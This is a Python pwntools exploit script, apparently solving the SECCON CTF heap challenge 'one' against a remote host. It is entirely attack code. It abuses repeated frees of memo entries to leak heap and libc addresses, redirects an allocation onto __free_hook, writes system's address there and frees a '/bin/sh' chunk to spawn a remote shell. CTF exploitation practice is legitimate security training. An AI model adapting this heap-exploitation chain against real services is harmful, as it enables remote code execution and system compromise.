from pwn import *
context.log_level = 'debug'

TARGET = './one'
HOST = 'one.chal.seccon.jp' 
PORT = 18357 

# r = process(TARGET)
# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
r = remote(HOST, PORT)

gdb.attach(r, '''
c
''')
elf = ELF(TARGET)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))


r.sendlineafter('> ', '1')
r.sendlineafter('memo > ', p64(0)+p64(0x91)+p64(0))

payload = p64(0x21) * 8
payload = payload[:-1]
for i in range(2):
    r.sendlineafter('> ', '1')
    r.sendafter('memo > ', payload)

r.sendlineafter('> ', '3') # delete
r.sendlineafter('> ', '3') # delete
r.sendlineafter('> ', '3') # delete 
r.sendlineafter('> ', '2') # show
heap_leak = u64(r.recvuntil('>').split('\n')[0].ljust(8, '\x00'))
dbg("heap_leak") 
# heap_base = heap_leak - 0x1270 
# dbg("heap_base")
target = heap_leak - 0x90 
dbg("target") 

r.sendline('1')
r.sendlineafter('memo > ', p64(target))

r.sendlineafter('> ', '1')
r.sendlineafter('memo > ', 'BBBB')
r.sendlineafter('> ', '1')
r.sendlineafter('memo > ', 'BBBB')

for i in range(8):
    r.sendlineafter('> ', '3') # delete 
r.sendlineafter('> ', '2') # show
libc_leak = u64(r.recvuntil('>').split('\n')[0].ljust(8, '\x00'))
dbg("libc_leak") 

base = libc_leak - 0x3ebca0
dbg("base") 

fh = base + 0x3ed8e8
system = base + 0x4f440

r.sendline('1')
r.sendlineafter('memo > ', 'CCCC')

r.sendlineafter('> ', '3') # delete
r.sendlineafter('> ', '3') # delete 
r.sendlineafter('> ', '1')
r.sendlineafter('memo > ', p64(fh))

r.sendlineafter('> ', '1')
r.sendlineafter('memo > ', 'CCCC')
r.sendlineafter('> ', '1')
r.sendlineafter('memo > ', p64(system))

r.sendlineafter('> ', '1')
r.sendlineafter('memo > ', '/bin/sh')

r.sendlineafter('> ', '3')

r.interactive()
r.close()
